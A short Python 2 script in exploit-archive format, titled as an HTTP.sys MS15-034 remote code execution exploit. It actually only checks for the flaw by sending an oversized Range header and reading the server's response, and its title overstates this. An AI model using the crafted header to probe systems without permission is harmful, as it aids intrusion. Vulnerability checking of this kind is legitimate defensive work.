#!/usr/bin/python

# Exploit Title: HTTP.sys allow remote code execution MS15-034, CVE-2015-1635
# Google Dork: -
# Date: 24/08/2017
# Exploit Author: Juttikhun Khamchaiyaphum
# Vendor Homepage: N/A
# Software Link: N/A
# Version: N/A
# Tested on: N/A
# CVE : CVE-2015-1635
# Usage: ms15-034-check.py <full URL>

import requests
import sys
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
class bcolors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'


def check(url):
	print "[*] MS15-034, CVE-2015-1635 Checking Tool"
	print "[*] Setting HTTP header..."
	headers = {"User-Agent": "Linux / Firefox 44: Mozilla/5.0 (X11; Fedora; Linux x86_64; rv:44.0) Gecko/20100101 Firefox/44.0", 
				"Accept-Encoding": "gzip, deflate",
				"Accept": "*/*",
				"Range": "bytes=0-18446744073709551615",
				"Connection": "keep-alive"
				}
	print "[*] Testing\n"
	print "[*] Result: "
	r = requests.get(url, headers=headers, verify=False, timeout=5, allow_redirects=False)
	if r.status_code == 416 or "Requested Range Not Satisfiable" in r.text:
		print "[*] Status: " + str(r.status_code)
		print bcolors.FAIL + "[-] The target seem to be vulnerable!\n" + bcolors.ENDC
		print "[!] For more information please visit the official Microsoft site: https://technet.microsoft.com/en-us/library/security/ms15-034.aspx"
	else:
		print "[*] Status: " + str(r.status_code)
		print bcolors.OKBLUE + "[-] The target seem to be not vulnerable!\n" + bcolors.ENDC
if __name__ == "__main__":
    try:
		url = sys.argv[1]
		check(url)
    except IndexError:
		 print("Usage: ms15-034-check.py <target URL>")
    exit(0)
